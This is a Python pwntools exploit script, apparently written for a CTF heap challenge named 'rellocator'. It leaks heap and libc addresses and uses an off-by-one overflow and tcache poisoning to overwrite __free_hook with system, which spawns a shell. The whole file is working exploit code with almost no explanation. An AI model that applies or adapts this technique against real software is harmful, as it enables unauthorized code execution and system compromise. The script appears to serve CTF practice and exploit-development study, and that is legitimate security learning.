#coding=utf-8
from pwn import *
local = 1
exec_file="./rellocator"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x000000000000DFA)
    b *($text_base+0x000000000000FAA)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter(">> ",str(idx))
def malloc(idx,size,content):
    menu(1)
    a.sendlineafter("Index:\n",str(idx))
    a.sendlineafter("Size:\n",str(size))
    a.sendafter("Data:\n",content)
def realloc(idx,size,content=""):
    menu(2)
    a.sendlineafter("Index:\n",str(idx))
    a.sendlineafter("Size:\n",str(size))
    if(size == 0):
        return
    a.sendafter("Data:\n",content)
def show(idx):
    menu(3)
    a.sendlineafter("Index:\n",str(idx))
    a.recvuntil("Data :")
def Magic(size):
    a.sendlineafter("Magic Size:",str(size))

Magic(0x10)

malloc(0,0x48,'A')

malloc(1,0x18,'A')

for i in range(2,2+11+7):#2 - 19  TODO:Get largebin chunk 
    malloc(i,0x58,p64(0x400)*11)

for i in range(20,20+7+7+1):# 20 - 34 TODO: get small bin chunk
    malloc(i,0x48,p64(0x21)*9)

for i in range(2,2+11+7):# puts in fastbin 
    realloc(i,0)

menu('1'*0x500) # malloc_consolidate && put in large bin 

malloc(38,0x58,'A')
show(38)
heap_addr = u64(a.recv(6)+'\x00\x00')-0x441
fuck(heap_addr)
realloc(38,0x58,'A'*0x58)#offbyone 
#debug()

malloc(36,0x48,'A')# 0x555555757580
show(36)
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["__malloc_hook"]-0x10-1025
fuck(libc_base)
#debug()
malloc(37,0x38,'A')# 0x5555557575d0
malloc(41,0x38,'A')# 0x555555757610
malloc(42,0x38,'A')# 0x555555757650
malloc(43,0x38,'A')# 0x555555757690

for i in range(21,20+7+1):
    realloc(i,0)
realloc(20,0)
realloc(36,0)
#debug()
menu('1'*0x500)

for i in range(21,20+7+1):
    malloc(i,0x38,'A')
for i in range(2,2+4):
    malloc(i,0x38,'A')
#debug()
#realloc(37,0)
__free_hook = libc_base+libc.symbols["__free_hook"]
malloc(39,0x38,p64(0)+p64(0x21)) # 0x555555757620
realloc(37,0)
realloc(39,0)
malloc(39,0x38,p64(0)+p64(0x21)+p64(__free_hook))
malloc(40,0x18,'/bin/sh\x00')
#debug()
malloc(44,0x18,p64(libc_base+libc.symbols["system"]))
realloc(40,0)
#debug()
a.interactive()







